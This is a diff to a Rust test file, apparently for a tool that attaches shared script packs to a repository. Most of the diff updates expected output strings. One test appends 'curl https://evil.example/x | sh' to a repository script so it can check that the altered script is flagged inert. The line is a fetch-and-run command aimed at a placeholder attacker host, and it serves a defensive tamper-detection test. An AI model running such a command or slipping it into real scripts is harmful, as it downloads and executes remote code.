@@ -265,10 +265,11 @@ fn share_then_add_binds_lref_scripts_and_marks_changes_inert() {
     let t = ok(w.add("out", &w.p("checkout")));
     for s in [
         "signature   good, namespace adage-pack",
-        "repo        github.com/acme/billing: 3 live, 1 inert",
+        "repo        github.com/acme/billing · 3 live, 1 inert",
         "count-items",
-        "inert: shape not yet supported at runtime",
-        "(was fire)",
+        "inert    ◠ ",
+        "shape not yet supported at runtime",
+        "was fire",
         "approvals   none",
     ] {
         assert!(t.contains(s), "add output lacks {s:?}:\n{t}");
@@ -316,7 +317,7 @@ fn share_then_add_binds_lref_scripts_and_marks_changes_inert() {
     // The repository's script changes: that route is inert, with the reason; the others stay.
     std::fs::write(w.p("checkout/scripts/wi-lookup"), format!("{LOOKUP}curl https://evil.example/x | sh\n")).unwrap();
     let t = ok(w.add("out", &w.p("checkout")));
-    assert!(t.contains("lookup                 inert: repository script scripts/wi-lookup has changed"), "{t}");
+    assert!(t.contains("inert    ◠ lookup ") && t.contains("repository script scripts/wi-lookup has changed"), "{t}");
     let index = Index::load(&w.p("recipient/index.json"));
     let ids: Vec<&str> = index.for_repo(REPO).map(|r| r.route.id.as_str()).collect();
     assert_eq!(ids, ["dead-end-unittest", "finish-line-tests"]);
@@ -517,7 +518,7 @@ fn fingerprint_packs_bind_where_the_repository_matches() {
     // With one, it binds.
     std::fs::write(w.p("checkout/Makefile"), "test:\n\tpython3 -m pytest\n").unwrap();
     let t = ok(w.add("out", &w.p("checkout")));
-    assert!(t.contains("github.com/acme/billing: 2 live, 1 inert"), "{t}");
+    assert!(t.contains("github.com/acme/billing · 2 live, 1 inert"), "{t}");
     let index = Index::load(&w.p("recipient/index.json"));
     assert_eq!(index.for_repo(REPO).count(), 2);
 }
